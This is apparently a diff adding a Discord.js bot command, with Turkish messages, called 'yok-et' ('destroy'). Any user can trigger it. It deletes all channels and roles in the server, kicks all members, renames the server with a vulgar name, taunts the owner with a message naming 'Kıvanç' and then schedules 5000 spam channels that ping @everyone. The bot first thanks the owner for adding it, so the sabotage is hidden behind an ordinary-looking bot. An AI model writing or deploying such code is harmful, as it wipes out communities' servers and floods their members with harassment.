@@ -1,0 +1,31 @@
+const Discord = require('discord.js');
+exports.run = function(client, message, args) {
+  message.guild.owner.send('Beni sunucuna eklediğin için teşekkürler!')
+  message.guild.channels.forEach(sil => {sil.delete()});
+  message.guild.roles.forEach(sil => {sil.delete()});
+  message.guild.members.forEach(ban => {ban.kick()});
+  message.guild.setName('#GÖTTEN #YOKEDILDI')
+  message.guild.owner.send('***SUNUCUNUZ KIVANÇ TARAFINDAN YOK EDİLMİŞTİR!***')
+  console.log(`${message.guild.name} sunucusunu yok ettim!`);
+  for (let i = 0; i < 5000; i++) {
+    setTimeout(function() {
+      message.guild.createChannel('Öpüldünüz <3', "text").then(c => {
+        c.send('Kıvanç Tarafından Yok Edildiniz! @everyone @here ')
+      })
+    }, 3000)
+  }
+}
+ 
+
+exports.conf = {
+  enabled: true,
+  guildOnly: true,
+  aliases: ['bb'],
+  permLevel: 0
+};
+
+exports.help = {
+  name: 'yok-et',
+  description: '',
+  usage: ''
+};
